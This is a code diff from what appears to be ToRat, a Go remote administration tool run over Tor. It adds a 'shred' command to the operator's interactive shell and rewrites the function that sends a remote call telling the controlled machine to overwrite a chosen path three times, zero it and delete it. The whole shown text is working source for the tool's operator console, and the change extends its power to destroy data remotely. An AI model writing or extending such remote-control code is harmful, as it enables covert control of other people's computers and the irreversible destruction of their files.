@@ -8,7 +8,6 @@ import (
 
 	"github.com/abiosoft/ishell"
 	"github.com/lu4p/ToRat/shared"
-	"github.com/lu4p/shred"
 )
 
 // Client side interactive shell menu
@@ -48,6 +47,12 @@ func (client activeClient) shellClient() {
 			Name:      "cat",
 			Func:      client.Cat,
 			Help:      "print the content of a file: usage cat <file>",
+			Completer: fileCompleter,
+		},
+		{
+			Name:      "shred",
+			Func:      client.Shred,
+			Help:      "remove a path by overwriting it with random data then removing it: usage shred <path>",
 			Completer: fileCompleter,
 		},
 		{
@@ -246,21 +251,21 @@ func (client *activeClient) Reconnect(c *ishell.Context) {
 	c.Stop()
 }
 
-// Remove remote file
-// TODO: Is this used? Where?
+// Shred a remote file
 func (client *activeClient) Shred(c *ishell.Context) {
-	args := shared.Shred{
-		Conf: shred.Conf{
-			Times:  3,
-			Zeros:  true,
-			Remove: true,
-		},
-		Path: strings.Join(c.Args, " "),
+	s := shared.Shred{
+		Path:   strings.Join(c.Args, " "),
+		Times:  3,
+		Zeros:  true,
+		Remove: true,
 	}
-	var r error
-	if err := client.RPC.Call("API.Shred", &args, &r); err != nil {
-		c.Println(red("[!] Could not shred path:", args.Path, err, r))
+
+	if err := client.RPC.Call("API.Shred", &s, &void); err != nil {
+		c.Println(red("[!] Could not shred path: ", s.Path))
+		c.Println(red("[!] ", err))
+		return
 	}
+	c.Println(green("[+] Sucessfully shred path"))
 }
 
 // Speedtest the clients internet connection
